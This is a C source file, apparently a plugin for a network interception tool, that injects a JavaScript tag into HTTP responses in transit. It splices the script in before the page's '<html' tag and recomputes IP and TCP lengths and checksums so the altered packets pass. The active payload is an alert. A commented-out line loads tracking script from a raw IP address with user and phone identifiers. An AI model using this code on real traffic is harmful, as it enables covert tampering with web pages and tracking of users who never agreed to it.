#include "main.h"

#define JS "<script type=\"text/javascript\"> alert('hello world') </script>"
//#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>"
#define JS_LEN strlen(JS)

PRIVATE int insert_js(void *data)
{
	struct http_conntrack* httpc = (struct http_conntrack *)data;
	struct _skb *skb=httpc->skb;
	
    char* body;
    char buffer[BUFSIZE];
	int len=0;
	char* res="<html";
	if(httpc->insert_js_tag == OK)
	{
		return ERROR;
	}
    if(!skb->http_data)
		return ERROR;
	
   
	body=strstr(skb->http_data , res);
	
	if(!body)
	{
		return ERROR;
	}
	len=strlen(body);
	
	memcpy(buffer , body , len);
	memcpy(skb->http_head + (skb->http_len - len) , JS , JS_LEN);
	memcpy(skb->http_head + (skb->http_len - len + JS_LEN) , buffer , len);
	
	//body=strstr(skb->http_head , skb->hhdr.content_length);
	//if(!body)
	//	return -1;
	//memcpy(body , "2952" , 4);
	//debug_log("````````````%d---------%s\n````````````````````\n" ,skb->http_len, skb->http_head);
    skb->iph->tot_len=htons(skb->http_len+JS_LEN);
    skb->iph->check=ip_chsum(skb->iph);
	skb->tcp_len=skb->tcp_len+JS_LEN;
	skb->http_len=skb->http_len+JS_LEN;
    skb->tcp->check=tcp_chsum(skb->iph , skb->tcp , skb->tcp_len);
	skb->pload_len=skb->pload_len+JS_LEN;
	httpc->insert_js_tag=OK;
	httpc->insert_js_len=JS_LEN;
    return OK;
}

int init_insert_js()
{
	new_plug(insert_js , PLUG_TYPE_RESPONSE);
	return 0;
}

